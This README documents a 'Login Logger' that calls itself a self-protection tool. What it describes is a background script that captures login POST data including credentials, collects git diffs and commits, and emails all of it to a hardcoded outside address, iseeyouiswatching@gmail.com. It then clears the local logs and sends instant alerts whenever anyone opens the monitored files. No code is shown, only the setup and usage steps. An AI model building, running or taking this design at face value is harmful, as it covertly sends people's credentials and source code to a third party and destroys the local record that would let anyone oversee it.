# Login Logger - Security Monitoring Tool

## Purpose
These scripts help you monitor and log your own login activity to detect unauthorized access to your credentials. If someone else is using your account, you'll have detailed logs to identify:
- When the unauthorized access occurred
- From what IP address
- What system/device was used
- Geographic location (if available)

## Available Loggers

### 1. System Login Logger (`login_logger.py`)
Logs local system login details and session activity.

**Usage:**
```bash
python3 scripts/login_logger.py
```

**What it logs:**
- Timestamp of each check
- Username
- Hostname
- IP address
- System platform information
- Architecture and processor details

**When to use:**
- Monitoring local system access
- Tracking who's using your user account
- Detecting unauthorized terminal/shell sessions

---

### 2. Web Login Logger (`web_login_logger.py`)
Creates a logging endpoint for web-based login attempts.

**Usage:**
```bash
python3 scripts/web_login_logger.py
```

**What it logs:**
- Client IP address and port
- User-Agent (browser/device information)
- Referrer URL
- Request headers
- POST data (credentials - be careful with this)
- Timestamp

**When to use:**
- Monitoring web application logins
- Tracking API authentication attempts
- Detecting unauthorized web access

---

## Email Configuration

### IMPORTANT: Setup Email First

Before running the logger, you **MUST** configure email settings to receive your logs at 7am.

**Step 1: Create email configuration file**
```bash
cd /home/user/claude-mgi
cp scripts/email_config.json.example scripts/email_config.json
```

**Step 2: Edit the configuration**
```bash
nano scripts/email_config.json  # or use your preferred editor
```

**Step 3: Fill in your details**
```json
{
  "smtp_server": "smtp.gmail.com",
  "smtp_port": 587,
  "sender_email": "your-email@gmail.com",
  "sender_password": "your-app-password-here",
  "recipient_email": "iseeyouiswatching@gmail.com",
  "use_tls": true
}
```

### Gmail Setup (Recommended)

1. **Enable 2-Factor Authentication** on your Gmail account
2. **Generate an App Password:**
   - Go to https://myaccount.google.com/apppasswords
   - Select "Mail" and "Other (Custom name)"
   - Name it "Login Logger"
   - Copy the 16-character password
3. **Use the App Password** in `email_config.json` (NOT your regular password)

### Other Email Providers

**Outlook/Hotmail:**
```json
"smtp_server": "smtp-mail.outlook.com",
"smtp_port": 587
```

**Yahoo:**
```json
"smtp_server": "smtp.mail.yahoo.com",
"smtp_port": 587
```

**ProtonMail:**
```json
"smtp_server": "smtp.protonmail.com",
"smtp_port": 587
```

---

## How to Use

### Quick Start (System Logger)
```bash
# Run the system login logger
cd /home/user/claude-mgi
python3 scripts/login_logger.py
```

The logger will:
1. Start immediately
2. Log every 5 minutes
3. Stop automatically at 7:00 AM
4. **Email logs and git diffs to iseeyouiswatching@gmail.com**
5. **Clear all logs after successful email**
6. Create a summary report (if email fails)

### Logs Location
- System logs: `login_details.log`
- Web logs: `web_login_details.log`
- Summary: `login_details_summary.txt`

### Running in Background
```bash
# Run in background (continues even if you close terminal)
nohup python3 scripts/login_logger.py > /dev/null 2>&1 &

# Check if it's running
ps aux | grep login_logger

# Stop it manually
pkill -f login_logger.py
```

---

## Analyzing the Logs

### What to Look For

**Suspicious Activity Indicators:**
1. **Unfamiliar IP Addresses**
   - Look for IPs that don't match your location
   - Multiple IPs in short time period

2. **Unusual Timestamps**
   - Logins when you were asleep
   - Logins from times you weren't using the system

3. **Different System Information**
   - Different operating systems
   - Different hostnames
   - Different user agents/browsers you don't use

4. **Geographic Anomalies**
   - Logins from cities/countries you're not in
   - Impossible travel (two locations too far apart in too short a time)

### Reading the Log Files

Logs are in JSON format for easy parsing:
```json
{
  "timestamp": "2026-01-11T06:30:00.123456",
  "username": "youruser",
  "system_info": {
    "hostname": "your-computer",
    "ip_address": "192.168.1.100",
    "platform": "Linux"
  }
}
```

### Extract Specific Information

**Get all unique IP addresses:**
```bash
grep "ip_address" login_details.log | sort | uniq
```

**Get all timestamps:**
```bash
grep "timestamp" login_details.log
```

**Search for specific IP:**
```bash
grep "123.456.789.000" login_details.log
```

---

## Security Notes

### IMPORTANT: Protecting Your Logs

1. **Don't commit logs to git:**
   ```bash
   # Add to .gitignore
   echo "*.log" >> .gitignore
   echo "*_summary.txt" >> .gitignore
   ```

2. **Secure file permissions:**
   ```bash
   chmod 600 login_details.log
   chmod 600 web_login_details.log
   ```

3. **Encrypt sensitive logs:**
   ```bash
   # Encrypt with GPG
   gpg -c login_details.log
   # This creates login_details.log.gpg
   ```

### Privacy Considerations

- These logs contain sensitive information
- Store them securely
- Delete them when investigation is complete
- Don't share raw logs publicly

---

## Anti-Tampering Protection

### Automatic File Access Detection

The logger now includes **automatic file access protection** that monitors for unauthorized access:

**What it monitors:**
- `login_details.log` - The main log file
- `email_config.json` - Email configuration
- `login_logger.py` - The logger script itself
- All related monitoring files

**When triggered:**
- Someone tries to view the log files (via `cat`, `less`, editor, etc.)
- Someone tries to modify the monitoring scripts
- Someone accesses files via GitHub web interface
- Git operations on monitored files

**What happens immediately:**
1. 🚨 Security alert logged
2. 📧 Email sent INSTANTLY to iseeyouiswatching@gmail.com
3. 🗑️ Logs cleared after successful email
4. 🔄 Monitoring continues

**This means:**
- If an intruder discovers the monitoring system, you'll know immediately
- Evidence is secured via email before they can tamper with logs
- They can't delete or modify the logs without you getting a copy first
- You depend ONLY on email - local logs may be compromised

### Why This Matters

**Without file protection:**
- Intruder finds logs → deletes them → no evidence

**With file protection:**
- Intruder touches logs → instant email → evidence preserved → logs cleared

This ensures you **always** have the evidence, even if someone tries to cover their tracks.

---

## What Gets Emailed at 7am

When the logger reaches 7:00 AM, it automatically:

1. **Collects all logged data:**
   - Login timestamps
   - IP addresses and hostnames
   - System information
   - User activity

2. **Gathers git repository changes:**
   - Git status (modified files)
   - Staged changes (git diff --cached)
   - Unstaged changes (git diff)
   - Recent commits (last 10)

3. **Sends email to iseeyouiswatching@gmail.com with:**
   - `login_details.log` (attached)
   - `login_details_summary.txt` (attached)
   - Git diffs in email body
   - Timestamp and security warnings

4. **Clears all logs** (only if email succeeds)
   - Prevents log accumulation
   - Protects against log tampering
   - Ensures fresh start for next session

5. **If email fails:**
   - Logs are NOT cleared
   - Summary report saved locally
   - Error logged for debugging

---

## Stopping the Logger

### Manual Stop
Press `Ctrl+C` in the terminal where it's running

### Automatic Stop
Logger automatically stops at 7:00 AM

### Kill Background Process
```bash
pkill -f login_logger.py
```

---

## Next Steps After Detecting Unauthorized Access

If you find suspicious activity:

1. **Immediately change your password**
2. **Enable two-factor authentication (2FA)**
3. **Review account security settings**
4. **Check for unauthorized changes**
5. **Log out all other sessions**
6. **Scan for malware/keyloggers**
7. **Contact support if needed**

---

## Customization

### Change Stop Time
Edit the script and modify:
```python
target_time = time(7, 0)  # Change to desired hour
```

### Change Logging Frequency
```python
time.sleep(300)  # 300 seconds = 5 minutes
```

### Change Log File Location
```python
logger = LoginLogger(log_file="/path/to/your/logfile.log")
```

---

## Troubleshooting

**Logger won't start:**
- Check Python version: `python3 --version`
- Check permissions: `ls -la scripts/login_logger.py`
- Make executable: `chmod +x scripts/login_logger.py`

**No logs being created:**
- Check disk space: `df -h`
- Check write permissions: `touch login_details.log`
- Check for errors: Run without `nohup` to see output

**Can't find logs:**
- Check current directory: `pwd`
- Search for logs: `find . -name "*.log"`

---

## Example Output

```
2026-01-11 06:30:15,123 - INFO - ============================================================
2026-01-11 06:30:15,124 - INFO - Starting login monitoring session
2026-01-11 06:30:15,124 - INFO - Monitoring will stop at 7:00 AM
2026-01-11 06:30:15,124 - INFO - ============================================================
2026-01-11 06:30:15,125 - INFO - LOGIN ATTEMPT: {
  "timestamp": "2026-01-11T06:30:15.125000",
  "username": "youruser",
  "system_info": {
    "hostname": "your-computer",
    "ip_address": "192.168.1.100",
    "platform": "Linux"
  },
  "additional_info": {
    "event": "session_start",
    "note": "Independent logging started for credential monitoring"
  }
}
```

---

**Remember:** This is YOUR security tool. Keep logs private and secure.
